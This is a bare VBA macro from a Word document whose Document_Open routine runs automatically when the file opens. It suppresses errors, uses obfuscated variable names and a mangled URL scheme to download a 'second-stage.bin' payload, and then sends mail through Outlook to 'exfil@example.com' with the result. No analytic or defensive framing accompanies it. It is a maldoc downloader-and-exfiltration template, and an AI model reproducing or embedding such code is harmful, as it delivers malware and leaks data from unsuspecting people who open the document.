Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim jybosg1pnivrj As Object, url As String
    Dim lps4wdhm As Object, sbospdtkrqzns As Object
    On Error Resume Next
    url = "jybosg1pnivrj://127.0.0.1:9090/second-stage.bin"
    Set jybosg1pnivrj = CreateObject("MSXML2.XMLHTTP")
    jybosg1pnivrj.Open "GET", url, False
    jybosg1pnivrj.Send
    Set lps4wdhm = CreateObject("Outlook.Application")
    Set sbospdtkrqzns = lps4wdhm.CreateItem(0)
    sbospdtkrqzns.To = "exfil@example.com"
    sbospdtkrqzns.Subject = "logs"
    sbospdtkrqzns.Body = jybosg1pnivrj.Status
    sbospdtkrqzns.Send
End Sub
